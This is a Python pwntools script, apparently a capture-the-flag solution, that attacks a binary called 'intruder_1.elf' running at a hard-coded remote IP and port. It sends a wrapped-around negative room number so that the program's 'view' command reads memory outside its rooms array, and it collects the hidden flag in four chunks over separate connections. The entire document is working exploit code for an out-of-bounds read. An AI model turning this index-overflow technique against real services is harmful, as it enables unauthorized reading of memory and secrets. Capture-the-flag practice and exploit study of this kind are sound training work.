#!/usr/bin/env python3
from pwn import *
import re

context.update(arch = 'i386')
exe = './intruder_1.elf'

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11691)

def local(argv = [], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv = [], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript = gdbscript)
    return io

def start(argv = [], *a, **kw):
    '''Start the exploit against the target'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

rooms = 0x4040a0
flag = 0x4048a0

max_int64 = 0xffffffffffffffff
room_number = (max_int64 - (flag - rooms)) // 8 + 1

flag = ''
for i in range(4):
    io = start()
    
    io.recvuntil(b'Commands: view, order\n')
    io.sendline(b'view')
    
    io.recvuntil(b'Enter room number\n')
    io.sendline(str(i - room_number))
    
    data = io.readline()
    flag_part_bytes = re.findall(r'Ordered by: (.*?)\n', data.decode())[0]
    flag_part_string = bytes.fromhex(flag_part_bytes)[::-1].decode()
    flag += flag_part_string
    
    io.close()

log.success('Flag: {}'.format(flag.strip('\x00')))